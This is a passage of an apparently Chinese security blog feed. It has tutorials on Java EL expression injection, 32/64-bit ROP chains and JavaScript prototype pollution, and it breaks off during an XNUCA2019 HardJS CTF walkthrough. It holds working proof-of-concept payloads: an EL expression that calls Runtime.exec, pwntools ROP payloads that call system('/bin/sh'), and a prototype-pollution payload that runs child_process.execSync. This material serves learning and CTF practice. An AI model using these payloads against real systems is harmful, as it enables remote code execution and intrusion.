class="line">如果n&lt;src的长度，只是将src的前n个字符复制到dest的前n个字符，不自动添加<span class="string">&#x27;\0&#x27;</span>。如果src的长度小于n个字节，则以<span class="literal">NULL</span>填充dest直到复制完n个字节</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaEL表达式注入</title>
    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>之前一直打算写一篇解析，拖了一久就开始写了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
<span id="more"></span>

<h1 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a><center>JAVA反射机制</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JAVA反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>；这种<code>动态获取的信息</code>以及<code>动态调用对象</code>的方法的功能称为<code>java语言的反射机制</code>。<br>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
<ul>
<li>Java中编译类型有两种：<ul>
<li><strong>静态编译</strong>：在编译时确定类型，绑定对象即通过。</li>
<li><strong>动态编译</strong>：运行时确定类型，绑定对象。动态编译最大限度地发挥了Java的灵活性，体现了多态的应用，可以减低类之间的耦合性。</li>
</ul>
</li>
<li>实现Java反射机制的类都位于<code>java.lang.reflect</code>包中：<ol>
<li>Class类：代表一个类</li>
<li>Field类：代表类的成员变量（类的属性）</li>
<li>Method类：代表类的方法</li>
<li>Constructor类：代表类的构造方法</li>
<li>Array类：提供了动态创建数组，以及访问数组的元素的静态方法</li>
</ol>
</li>
</ul>
<p><strong>一句话概括就是使用反射可以赋予jvm动态编译的能力，否则类的元数据信息只能用静态编译的方式实现，例如热加载，Tomcat的classloader等等都没法支持。</strong></p>
<p>而JAVA EL表达式的命令执行Payload正需要反射调用的方式来实现。</p>
<p>以上只是为了简单回顾一下反射，第一次知道反射的同学可能还是蒙蔽的，建议还是好好了解一下。</p>
<h1 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><center>EL表达式基础</center></h1><p>EL表达式是为了转化为JSP代码的，简洁表达式形式，相比直接使用JSP，EL表达式拥有更好的可读性。</p>
<p>EL 表达式语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;EL表达式&#125;</span><br></pre></td></tr></table></figure>


<p>EL 表达式语法以<code>$&#123;</code>开头，以<code>&#125;</code>结束，中间为合法的表达式。</p>
<h1 id="EL表达式注入原理解析"><a href="#EL表达式注入原理解析" class="headerlink" title="EL表达式注入原理解析"></a><center>EL表达式注入原理解析</center></h1><p><code>pagecontext</code>域可操纵<code>request</code> <code>session</code> <code>application</code>，而这几个域里面均有setAttribute方法</p>
<ul>
<li><p>Attribute方法</p>
<ul>
<li>这个方法作用就是<strong>保存数据</strong>，然后还可以用<code>getAttribute</code>方法来取出。</li>
</ul>
</li>
<li><p>反射中的Method类的invoke() 和getMethod()</p>
<ul>
<li>getMethod() → 获得对象所声明的公开方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
  获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null</li>
</ul>
</li>
<li><p>getRuntime()方法<br>  <code>java.lang.Runtime.getRuntime() </code>方法返回与当前Java应用程序相关的运行时对象。大多数Runtime类的方法是实例方法，必须相对于当前的运行时对象被调用。</p>
</li>
<li><p>invoke()方法</p>
<ul>
<li>执⾏函数的⽅法</li>
</ul>
</li>
<li><p>getInputStream方法</p>
<ul>
<li><code>getInputStream()方法</code>在java.lang包中可用。</li>
<li><code>getInputStream()方法</code>用于获取流程和子流程的输入流。</li>
<li><code>getInputStream()方法</code>是一个非静态方法，只能通过类对象访问，如果尝试使用类名称访问该方法，则会收到错误消息。</li>
<li>返回输入流时，<code>getInputStream()方法</code>不会引发异常。</li>
</ul>
</li>
</ul>
<p>pagecontext域控制request.getSession()调用其中的getAttribute，getAttribute方法取出任意值a，<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>吧<code>java.lang.Runtime</code>反射出来，调用<code>java.lang.Runtime</code> 中的方法<code>getMethod（）</code> ，获得相应对象的getRuntime()方法,得到相关的Method对象，<code>invoke(null,null)</code> 反射得到exec()方法，getInputStream()方法简而言之就是可以有回显。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line">.getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
<p>实际为一行，换行只是为了更好看到。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>32位与64位ROP详解</title>
    <url>/PWN/32%E4%BD%8D%E4%B8%8E64%E4%BD%8DROP%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做pwn的前置知识，写EXP要用到。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown93016202_p0.jpg"></p>
<span id="more"></span>

<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP的全称为<code>Return-oriented programming</code>（返回导向编程），也可以理解为面向返回地址的编程，这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
<h2 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a><strong>为什么要ROP</strong></h2><p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种</p>
<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><p>32位程序的栈溢出，只有输入的字节填满栈空间，和返回地址，即可劫持栈帧，达到控制执行流的效果,</p>
<p>假设栈开辟了20字节的空间，rbp为8字节，由此可得payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(system_addr) + p32(bin_addr)</span><br></pre></td></tr></table></figure>




<h1 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h1><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。</p>
<p>分别是<code>rdi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>作为第1-6个参数。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，所以rbp作为通用寄存器使用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownfMxenQwX7syu6Ri.png"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,泄露出libc地址，调用system(“&#x2F;bin&#x2F;sh”)</p>
<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget –binary xxx –only “pop|ret”</span><br></pre></td></tr></table></figure>


<h1 id="泄露system地址和-x2F-bin-x2F-sh"><a href="#泄露system地址和-x2F-bin-x2F-sh" class="headerlink" title="泄露system地址和&#x2F;bin&#x2F;sh"></a>泄露system地址和&#x2F;bin&#x2F;sh</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br><span class="line">sh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))- libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br></pre></td></tr></table></figure>


<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>64位还要考虑堆栈平衡，由此可以有3种payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个payload利用ret来堆栈平衡</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 寄存器调用顺序：rdi、rsi、rdx、rcx、r8、r9</span></span><br><span class="line"><span class="comment"># 先利用pop+ret将bin_sh_addr地址弹到rdi寄存器中去，再调用system函数来执行</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>


<p>前两个payload利用64位程序函数调用参数规则构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// ret堆栈平衡，直接返回bin_sh_addr处也可以获得系统权限。</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(bin_sh_addr)</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>原型链污染</title>
    <url>/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要一定的js基础</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownZHNuSfXCDk4OEab.jpg"></p>
<span id="more"></span>

<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><p>又称<code>原型链污染</code>。</p>
<p>在JS语言中，函数即对象，如果要定义一个类，需要以<code>定义</code> 构造函数的方式来定义</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>


<p><strong>即是函数既可以作为对象去解释又可以作为函数去解释</strong></p>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个寻找到具体方法或者属性的机制。</p>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>如果希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>所以可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<p><code>foo.``**proto**`` == Foo.prototype</code></p>
<p><img src="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png"></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>


<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><img src="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png"></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作<code>prototype继承链</code>。</p>
<p>以上就是最基础的JavaScript面向对象编程，并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>前面说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>


<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><img src="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png"></p>
<p>原因也显而易见：因为前面修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<p>js中有个json.prase的方法,json解析的时候,会把<code>__proto__</code>变成一个键名，可以理解为和a同级,而不是一个原型的属性了，变成一个普通的属性。</p>
<p><img src="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png"></p>
<p>到此，其实只要出现继承且参数可控，就有可能有原型链污染出现。也就是出现函数作为对象解释，或者作为对象解释的某个东西在合并2个参数即可出现污染。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownasdasf.png"></p>
<p>常规Payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">e =&gt; &#123; <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> &#123;&#125;) &#123; <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[a]; &#125; <span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;uname -a&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其他视具体情况改变。</p>
<p>一般两个函数<code>(merge，和clone)</code>可以形成攻击环境</p>
<p><code>[a.name](http://a.name)`` = a[&#39;name&#39;]</code></p>
<h1 id="XNUCA2019Qualifier-HardJS"><a href="#XNUCA2019Qualifier-HardJS" class="headerlink" title="[XNUCA2019Qualifier]HardJS"></a>[XNUCA2019Qualifier]HardJS</h1><p>这题是可以下载源码的。</p>
<p>查看ejs的源码，看到下面代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>server.js</code>中是服务器的主要逻辑代码，可以看到其使用了<code>ejs</code>作为渲染引擎，并使用了中间件<code>body-parser</code>，通过这一行代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extend</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>


<p>说明服务器会接收POST传过来的json数据，而且我也知道这道题目的考察点就是原型链污染（因为就是奔着掌握这个知识点来刷题的），那么我们就可以通过这个接口传入参数到服务端了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span> ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(doms);</span><br><span class="line">            res.<span class="title function_">json</span>(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.<span class="property">length</span> ; i++)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">        res.<span class="title function_">json</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>分析以上代码知道，当<code>datalist</code>的长度大于5时，会执行这一条语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>


<p>然后问题就变成了怎么让<code>datalist</code> 的长度大于5，通过<code>server.js</code>定义的<code>/add</code>接口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">type</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">content</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span>;</span><br><span class="line"></span><br><span class="line">        newContent[req.<span class="property">body</span>.<span class="property">type</span>] = [ req.<span class="property">body</span>.<span class="property">content</span> ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values 